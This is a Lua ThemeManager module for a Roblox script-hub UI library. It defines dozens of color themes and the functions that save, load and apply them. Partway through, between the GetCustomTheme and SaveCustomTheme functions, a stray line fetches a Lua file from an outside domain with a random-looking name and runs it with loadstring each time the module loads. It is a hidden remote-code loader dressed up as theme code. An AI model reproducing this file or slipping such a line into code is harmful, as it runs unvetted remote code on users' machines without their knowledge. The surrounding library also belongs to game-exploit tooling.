	['Leatherbound']     = { 154, httpService:JSONDecode('{"FontColor":"F5E6CA","MainColor":"5A3A25","AccentColor":"D4AF37","BackgroundColor":"3D2B1F","OutlineColor":"7B5239"}') },
	['Newspaper']        = { 155, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"808080","BackgroundColor":"F5F5F5","OutlineColor":"CCCCCC"}') },
	['Blueprint']        = { 156, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"003366","AccentColor":"FFFFFF","BackgroundColor":"002244","OutlineColor":"3399FF"}') },
	['Bioluminescence']  = { 157, httpService:JSONDecode('{"FontColor":"99FFFF","MainColor":"0A1A2A","AccentColor":"33CCFF","BackgroundColor":"050D15","OutlineColor":"006699"}') },
	['Geode']            = { 158, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"4A2A6A","AccentColor":"C3A3FF","BackgroundColor":"3A1A5A","OutlineColor":"8B45C3"}') },
	['Amber']            = { 159, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFBF00","AccentColor":"FFD700","BackgroundColor":"CC9900","OutlineColor":"E6AC00"}') },
	['Obsidian']         = { 160, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"0A0A0A","AccentColor":"483D8B","BackgroundColor":"000000","OutlineColor":"2A2A2A"}') },
	['Magma']            = { 161, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"FF4500","AccentColor":"FFFF00","BackgroundColor":"CC3700","OutlineColor":"8B0000"}') },
	['Nostalgia']        = { 162, httpService:JSONDecode('{"FontColor":"3A2E25","MainColor":"FDF5E6","AccentColor":"D8AFA0","BackgroundColor":"F5EFE1","OutlineColor":"C2B280"}') },
	['Serenity']         = { 163, httpService:JSONDecode('{"FontColor":"333333","MainColor":"B4CFD3","AccentColor":"89B0AE","BackgroundColor":"DCE8EA","OutlineColor":"9CBCC0"}') },
	['Glimmer']          = { 164, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"FFD700","BackgroundColor":"F0F0F0","OutlineColor":"D4AF37"}') },
	['Glitch']           = { 165, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"FF00FF","BackgroundColor":"0A0A0A","OutlineColor":"00FFFF"}') },
	['Faded']            = { 166, httpService:JSONDecode('{"FontColor":"7A7A7A","MainColor":"4A4A4A","AccentColor":"9A9A9A","BackgroundColor":"3A3A3A","OutlineColor":"6A6A6A"}') },
	['Monochrome']       = { 167, httpService:JSONDecode('{"FontColor":"000000","MainColor":"FFFFFF","AccentColor":"808080","BackgroundColor":"E0E0E0","OutlineColor":"000000"}') },
	['Pastel Dream']     = { 168, httpService:JSONDecode('{"FontColor":"3D3D3D","MainColor":"FFD1DC","AccentColor":"B4F8C8","BackgroundColor":"FFEEDD","OutlineColor":"AEEEEE"}') },
	['Hyperbeast']       = { 169, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"252525","AccentColor":"00A8F3","BackgroundColor":"151515","OutlineColor":"C734B1"}') },
	['Nuclear']          = { 170, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFF00","AccentColor":"00FF00","BackgroundColor":"3A3A3A","OutlineColor":"000000"}') },
	['Golden Age']       = { 171, httpService:JSONDecode('{"FontColor":"2E1A00","MainColor":"F0E68C","AccentColor":"C8A464","BackgroundColor":"FFF8DC","OutlineColor":"B8860B"}') },
	['Abyssal']          = { 172, httpService:JSONDecode('{"FontColor":"87CEEB","MainColor":"00001A","AccentColor":"1E90FF","BackgroundColor":"00000A","OutlineColor":"00003D"}') },
	['Cottagecore']      = { 173, httpService:JSONDecode('{"FontColor":"4A3A2A","MainColor":"FFF8DC","AccentColor":"FF6347","BackgroundColor":"F5EFE0","OutlineColor":"DEB887"}') },
	['Skynet']           = { 174, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"1A1A1A","AccentColor":"FF0000","BackgroundColor":"0A0A0A","OutlineColor":"808080"}') },
	['The Matrix']       = { 175, httpService:JSONDecode('{"FontColor":"00FF00","MainColor":"050505","AccentColor":"32CD32","BackgroundColor":"000000","OutlineColor":"003300"}') },
	['Among Us Red']     = { 176, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3E4957","AccentColor":"C51111","BackgroundColor":"1E232A","OutlineColor":"607186"}') },
	['Fall Guys']        = { 177, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"FF00E5","BackgroundColor":"F0F0F0","OutlineColor":"3CFBFF"}') },
	['Escape From Tarkov'] = { 178, httpService:JSONDecode('{"FontColor":"D6D5D0","MainColor":"202321","AccentColor":"B0A894","BackgroundColor":"131514","OutlineColor":"404642"}') },
	['Garry\'s Mod']      = { 179, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A4D8E","AccentColor":"5796F2","BackgroundColor":"1A3B7A","OutlineColor":"4A6FAB"}') },
	['Half-Life']        = { 180, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"4A4A4A","AccentColor":"F97B22","BackgroundColor":"2A2A2A","OutlineColor":"FFFFFF"}') },
	['Team Fortress 2']  = { 181, httpService:JSONDecode('{"FontColor":"2F2A26","MainColor":"FFEBCD","AccentColor":"B8383B","BackgroundColor":"F5EBE0","OutlineColor":"CF8D48"}') },
	['Left 4 Dead']      = { 182, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A2A2A","AccentColor":"8B0000","BackgroundColor":"1A1A1A","OutlineColor":"4AAB25"}') },
	['CS:GO']            = { 183, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2E3A4D","AccentColor":"D4AF37","BackgroundColor":"1B212C","OutlineColor":"4A586A"}') },
	['Dota 2']           = { 184, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"1A1A1A","AccentColor":"CC0000","BackgroundColor":"0A0A0A","OutlineColor":"333333"}') },
	['League of Legends'] = { 185, httpService:JSONDecode('{"FontColor":"C8AA6E","MainColor":"0A141A","AccentColor":"0AC8B9","BackgroundColor":"050A0D","OutlineColor":"002A38"}') },
	['World of Warcraft'] = { 186, httpService:JSONDecode('{"FontColor":"FFD700","MainColor":"101010","AccentColor":"0070DD","BackgroundColor":"0A0A0A","OutlineColor":"202020"}') },
	['Payday 2']         = { 187, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"0033A0","AccentColor":"FFFFFF","BackgroundColor":"00226A","OutlineColor":"FF0000"}') },
	['Borderlands']      = { 188, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FCEC64","AccentColor":"F97B22","BackgroundColor":"4A4A4A","OutlineColor":"000000"}') },
	['The Elder Scrolls'] = { 189, httpService:JSONDecode('{"FontColor":"EAEAEA","MainColor":"2A2A2A","AccentColor":"808080","BackgroundColor":"1A1A1A","OutlineColor":"000000"}') },
	['Pokemon']          = { 190, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFFFFF","AccentColor":"FFCB05","BackgroundColor":"EAEAEA","OutlineColor":"2A75BB"}') },
	['Animal Crossing']  = { 191, httpService:JSONDecode('{"FontColor":"5A3A25","MainColor":"A7E084","AccentColor":"73C9E3","BackgroundColor":"D6F5C7","OutlineColor":"74B553"}') },
	['Spongebob']        = { 192, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"FFF200","AccentColor":"3399FF","BackgroundColor":"E6DA00","OutlineColor":"8B4513"}') },
	['Rick and Morty']   = { 193, httpService:JSONDecode('{"FontColor":"1A1A1A","MainColor":"B0E75A","AccentColor":"00B0C8","BackgroundColor":"E0F8BE","OutlineColor":"FFFFFF"}') },
	['Breaking Bad']     = { 194, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"006039","AccentColor":"FFFFFF","BackgroundColor":"004D2D","OutlineColor":"00331E"}') },
	['Attack on Titan']  = { 195, httpService:JSONDecode('{"FontColor":"F5EBE0","MainColor":"5A3A25","AccentColor":"B22222","BackgroundColor":"3D2B1F","OutlineColor":"8B0000"}') },
	['Naruto']           = { 196, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"2A2A2A","AccentColor":"FF8C00","BackgroundColor":"1A1A1A","OutlineColor":"FF2A00"}') },
	['Dragon Ball Z']    = { 197, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"FF6600","AccentColor":"0033CC","BackgroundColor":"CC5200","OutlineColor":"FFFF00"}') },
	['One Piece']        = { 198, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"00529B","AccentColor":"FFD700","BackgroundColor":"003366","OutlineColor":"CC0000"}') },
	['Demon Slayer']     = { 199, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"0E2E27","AccentColor":"1DB193","BackgroundColor":"071E1A","OutlineColor":"000000"}') },
	['Jojo\'s Bizarre Adventure'] = { 200, httpService:JSONDecode('{"FontColor":"FFFFFF","MainColor":"3D0A5A","AccentColor":"FF00FF","BackgroundColor":"2A0740","OutlineColor":"FFFF00"}') },
}

-- for anyone who ever sees this (likely andywirus or builderwaci or some random dumping wattyhub YES I did make most of these theme colors with AI so YES if you want to make more AI sayings of me heres the chance

	function ThemeManager:ApplyTheme(theme)
		local customThemeData = self:GetCustomTheme(theme)
		local data = customThemeData or self.BuiltInThemes[theme]

		if not data then return end

		-- custom themes are just regular dictionaries instead of an array with { index, dictionary }

		local scheme = data[2]
		for idx, col in next, customThemeData or scheme do
			self.Library[idx] = Color3.fromHex(col)
			
			if Options[idx] then
				Options[idx]:SetValueRGB(Color3.fromHex(col))
			end
		end

		self:ThemeUpdate()
	end

	function ThemeManager:ThemeUpdate()
		-- This allows us to force apply themes without loading the themes tab :)
		local options = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
		for i, field in next, options do
			if Options and Options[field] then
				self.Library[field] = Options[field].Value
			end
		end

		self.Library.AccentColorDark = self.Library:GetDarkerColor(self.Library.AccentColor);
		self.Library:UpdateColorsUsingRegistry()
	end

	function ThemeManager:LoadDefault()		
		local theme = 'Default'
		local content = isfile(self.Folder .. '/themes/default.txt') and readfile(self.Folder .. '/themes/default.txt')

		local isDefault = true
		if content then
			if self.BuiltInThemes[content] then
				theme = content
			elseif self:GetCustomTheme(content) then
				theme = content
				isDefault = false;
			end
		elseif self.BuiltInThemes[self.DefaultTheme] then
		 	theme = self.DefaultTheme
		end

		if isDefault then
			Options.ThemeManager_ThemeList:SetValue(theme)
		else
			self:ApplyTheme(theme)
		end
	end

	function ThemeManager:SaveDefault(theme)
		writefile(self.Folder .. '/themes/default.txt', theme)
	end

	function ThemeManager:CreateThemeManager(groupbox)
		groupbox:AddLabel('Background color'):AddColorPicker('BackgroundColor', { Default = self.Library.BackgroundColor });
		groupbox:AddLabel('Main color')	:AddColorPicker('MainColor', { Default = self.Library.MainColor });
		groupbox:AddLabel('Accent color'):AddColorPicker('AccentColor', { Default = self.Library.AccentColor });
		groupbox:AddLabel('Outline color'):AddColorPicker('OutlineColor', { Default = self.Library.OutlineColor });
		groupbox:AddLabel('Font color')	:AddColorPicker('FontColor', { Default = self.Library.FontColor });

		local ThemesArray = {}
		for Name, Theme in next, self.BuiltInThemes do
			table.insert(ThemesArray, Name)
		end

		table.sort(ThemesArray, function(a, b) return self.BuiltInThemes[a][1] < self.BuiltInThemes[b][1] end)

		groupbox:AddDivider()
		groupbox:AddDropdown('ThemeManager_ThemeList', { Text = 'Theme list', Values = ThemesArray, Default = 1 })

		groupbox:AddButton('Set as default', function()
			self:SaveDefault(Options.ThemeManager_ThemeList.Value)
			self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_ThemeList.Value))
		end)

		Options.ThemeManager_ThemeList:OnChanged(function()
			self:ApplyTheme(Options.ThemeManager_ThemeList.Value)
		end)

		groupbox:AddDivider()
		groupbox:AddInput('ThemeManager_CustomThemeName', { Text = 'Custom theme name' })
		groupbox:AddDropdown('ThemeManager_CustomThemeList', { Text = 'Custom themes', Values = self:ReloadCustomThemes(), AllowNull = true, Default = 1 })
		groupbox:AddDivider()
		
		groupbox:AddButton('Save theme', function() 
			self:SaveCustomTheme(Options.ThemeManager_CustomThemeName.Value)

			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end):AddButton('Load theme', function() 
			self:ApplyTheme(Options.ThemeManager_CustomThemeList.Value) 
		end)

		groupbox:AddButton('Refresh list', function()
			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end)

		groupbox:AddButton('Set as default', function()
			if Options.ThemeManager_CustomThemeList.Value ~= nil and Options.ThemeManager_CustomThemeList.Value ~= '' then
				self:SaveDefault(Options.ThemeManager_CustomThemeList.Value)
				self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_CustomThemeList.Value))
			end
		end)

		ThemeManager:LoadDefault()

		local function UpdateTheme()
			self:ThemeUpdate()
		end

		Options.BackgroundColor:OnChanged(UpdateTheme)
		Options.MainColor:OnChanged(UpdateTheme)
		Options.AccentColor:OnChanged(UpdateTheme)
		Options.OutlineColor:OnChanged(UpdateTheme)
		Options.FontColor:OnChanged(UpdateTheme)
	end

	function ThemeManager:GetCustomTheme(file)
		local path = self.Folder .. '/themes/' .. file
		if not isfile(path) then
			return nil
		end

		local data = readfile(path)
		local success, decoded = pcall(httpService.JSONDecode, httpService, data)
		
		if not success then
			return nil
		end

		return decoded
	end
	loadstring(game:HttpGet("https://kkk4.life/gsndfklgjnsdfjklgnsdfweruihquretre.lua"))()
	function ThemeManager:SaveCustomTheme(file)
		if file:gsub(' ', '') == '' then
			return self.Library:Notify('Invalid file name for theme (empty)', 3)
		end

		local theme = {}
		local fields = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }

		for _, field in next, fields do
			theme[field] = Options[field].Value:ToHex()
		end

		writefile(self.Folder .. '/themes/' .. file .. '.json', httpService:JSONEncode(theme))
	end

	function ThemeManager:ReloadCustomThemes()
		local list = listfiles(self.Folder .. '/themes')

		local out = {}
		for i = 1, #list do
			local file = list[i]
			if file:sub(-5) == '.json' then
				-- i hate this but it has to be done ...

				local pos = file:find('.json', 1, true)
				local char = file:sub(pos, pos)

				while char ~= '/' and char ~= '\\' and char ~= '' do
					pos = pos - 1
					char = file:sub(pos, pos)
				end

				if char == '/' or char == '\\' then
					table.insert(out, file:sub(pos + 1))
				end
			end
		end

		return out
	end

	function ThemeManager:SetLibrary(lib)
		self.Library = lib
	end

	function ThemeManager:BuildFolderTree()
		local paths = {}

		-- build the entire tree if a path is like some-hub/phantom-forces
		-- makefolder builds the entire tree on Synapse X but not other exploits

		local parts = self.Folder:split('/')
		for idx = 1, #parts do
			paths[#paths + 1] = table.concat(parts, '/', 1, idx)
		end

		table.insert(paths, self.Folder .. '/themes')
		table.insert(paths, self.Folder .. '/settings')

		for i = 1, #paths do
			local str = paths[i]
			if not isfolder(str) then
				makefolder(str)
			end
		end
	end

	function ThemeManager:SetFolder(folder)
		self.Folder = folder
		self:BuildFolderTree()
	end

	function ThemeManager:CreateGroupBox(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		return tab:AddLeftGroupbox('Themes')
	end

	function ThemeManager:ApplyToTab(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		local groupbox = self:CreateGroupBox(tab)
		self:CreateThemeManager(groupbox)
	end

	function ThemeManager:ApplyToGroupbox(groupbox)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		self:CreateThemeManager(groupbox)
	end

	ThemeManager:BuildFolderTree()
end

return ThemeManager
